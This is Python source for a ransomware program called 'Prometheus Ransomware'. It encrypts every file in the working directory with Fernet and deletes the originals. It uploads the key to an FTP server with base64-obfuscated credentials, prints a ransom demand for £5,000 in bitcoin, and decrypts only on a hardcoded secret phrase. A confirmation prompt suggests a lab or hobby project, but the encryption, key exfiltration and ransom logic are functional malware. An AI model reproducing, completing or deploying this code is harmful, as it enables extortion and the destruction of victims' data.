import os
import cryptography
from cryptography.fernet import Fernet
import ftplib
import base64
from tkinter import *
from colorama import Fore
import subprocess
import time


# Setting up colours

RED = Fore.RED
BOLD = "\033[1m"
RESET = Fore.RESET


# Setting up Tkinter

root = Tk()
secretphrase = "hacking"

files = []
file_name = []
file_ext = []
file_order = []

# let's find some files and encrypt them

def decrypt():
    files = []
    file_name = []

    for file in os.listdir():
        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "upload.py" or file == 'main.py' or file == 'download.py' or file == 'test.py' or file == 'README.md' or file == 'test2.py' or file == 'test3.py' or file == ".git" or file == 'LICENSE.md':
            continue

    if os.path.isfile(file):
        files.append(file)
        file_name = os.path.splitext(file)[0]
    
    try:
        user_phrase = input(BOLD + "\nEnter the secret phrase to decrypt your files: " + RESET)
        if user_phrase == secretphrase:
            download_key()
            with open("thekey.key", "rb") as key:
                secretkey = key.read()
            for file in file_order:
                with open(file, "rb") as thefile:
                    contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents)
                file_name = os.path.splitext(file)[0]
                for ext in file_ext:
                    original_filename = file_name + ext
                    file_ext.remove(ext)
                    break
                with open(original_filename, "wb") as thefile:
                    thefile.write(contents_decrypted)
                    os.remove(file)
            os.remove("thekey.key")
            time.sleep(5)
            print("\nCongratulations, your files have been decrypted!")
        else:
            time.sleep(5)
            print("\nSorry, the phrase you entered is wrong!")

    except (cryptography.fernet.InvalidToken, TypeError):
        print("\nThe files are not encrypted or there's been an unexpected error!")

def encrypt(choice):

    choice = choice.lower()
    if choice == "yes":
        for file in os.listdir():
            if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "upload.py" or file == 'main.py' or file == 'download.py' or file == 'test.py' or file == 'test2.py' or file == 'test3.py' or file == 'README.md':
                continue

            if os.path.isfile(file):
                files.append(file)
                file_name.append(os.path.splitext(file)[0])
                file_ext.append(os.path.splitext(file)[1])

        key = Fernet.generate_key()

        with open("thekey.key", "wb") as thekey:
            thekey.write(key)

    # Upload the key file to the FTP server and delete it from the victim's PC

        upload_key_to_ftp()
        
        os.remove("thekey.key")

        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            #tempTuple = os.path.splitext(file)
            for name in file_name:
                extension = ".pr0m37h3us4ev3r"
                encrypted_filename = name + extension
                with open(encrypted_filename, "wb") as thefile:
                    thefile.write(contents_encrypted)
                file_order.append(name + ".pr0m37h3us4ev3r")
                file_name.remove(name)
                break
            os.remove(file)
        
        root.destroy()
        time.sleep(2)
        print("\nOops, all of your files have been encrypted!\n")

        time.sleep(5)
        print("To decrypt your files, you must enter the correct secret phrase.")
        time.sleep(5)
        print("You will recieve this secret phrase after you pay £5,000 (GBP) worth of bitcoin to us.\n")
        time.sleep(10)
        decrypt()

    else:
        quit()

# Uploading the key file to the FTP server
def upload_key_to_ftp():
    try:
        for interface in os.listdir("/sys/class/net"):
            if interface == "lo":
                continue
            host_command = "ifconfig {} | grep 'inet ' | awk '{{print $2}}' | base64".format(interface)
            host_subprocess = subprocess.Popen(host_command, shell=True, stdout=subprocess.PIPE).stdout
            host_subread = host_subprocess.read().decode().strip()

            if (len(host_subread)) == 0:
                pass
            else:   
                base64_host = host_subread
        base64_bytes = base64_host.encode('ascii')
        host_bytes = base64.b64decode(base64_bytes)
        host = host_bytes.decode('ascii')

        base64_username = "Y29uY2F0ZW5hdGUK"
        base64_bytes = base64_username.encode('ascii')
        username_bytes = base64.b64decode(base64_bytes)
        username = username_bytes.decode('ascii')

        base64_password = "YXJzaHNlcmkxMjMK"
        base64_bytes = base64_password.encode('ascii')
        password_bytes = base64.b64decode(base64_bytes)
        password = password_bytes.decode('ascii')

        HOSTNAME = host.strip()
        USERNAME = username.strip()
        PASSWORD = password.strip()

        # Connect to the FTP server
        ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)

        # force UTF-8 encoding
        ftp_server.encoding = "utf-8"

        # print("Directory before upload")
        # ftp_server.dir()
        # print("-" * 50)

        filename = "thekey.key"
        # Store (STOR) the file in the FTP server directory
        with open(filename, "rb") as file:
            ftp_server.storbinary(f"STOR {filename}", file)
    except ConnectionRefusedError:
        print(f"\n{RED}Connection refused!{RESET}\n")
        input()

def download_key():
    for interface in os.listdir("/sys/class/net"):
        if interface == "lo":
            continue
        host_command = "ifconfig {} | grep 'inet ' | awk '{{print $2}}' | base64".format(interface)
        host_subprocess = subprocess.Popen(host_command, shell=True, stdout=subprocess.PIPE).stdout
        host_subread = host_subprocess.read().decode().strip()

        if (len(host_subread)) == 0:
            pass
        else:
            base64_host = host_subread
    base64_bytes = base64_host.encode('ascii')
    host_bytes = base64.b64decode(base64_bytes)
    host = host_bytes.decode('ascii')

    base64_username = "Y29uY2F0ZW5hdGUK"
    base64_bytes = base64_username.encode('ascii')
    username_bytes = base64.b64decode(base64_bytes)
    username = username_bytes.decode('ascii')

    base64_password = "YXJzaHNlcmkxMjMK"
    base64_bytes = base64_password.encode('ascii')
    password_bytes = base64.b64decode(base64_bytes)
    password = password_bytes.decode('ascii')

    HOSTNAME = host.strip()
    USERNAME = username.strip()
    PASSWORD = password.strip()

    # Connect to the FTP server
    ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)

    # force UTF-8 encoding
    ftp_server.encoding = "utf-8"

    filename = 'thekey.key'

    with open(filename, 'wb') as file:
        ftp_server.retrbinary(f'RETR {filename}', file.write)


root.geometry("780x300")
#root.attributes("-fullscreen", True)
root.title("Prometheus Ransomware SafeLock")
heading = Label(text="Prometheus Ransomware", bg="grey", fg="black", width="500", height="2", font=("helvetica", 30, 'bold'))
heading.pack()
safe_text = Label(text="This is a ransomware, are you sure you want to run it? Type \"yes\" to confirm.", font=("helvetica", 16))
safe_text.place(x=15, y=115)
safe = StringVar()
safe_entry = Entry(textvariable=safe, width=3, font=("helvetica", 27, 'bold'))
safe_entry.place(x=360, y=150)
submit = Button(text="Submit", width='10', font=("helvetica", 20), command=lambda: encrypt(safe.get()))
submit.place(x=300, y=225)


root.mainloop()
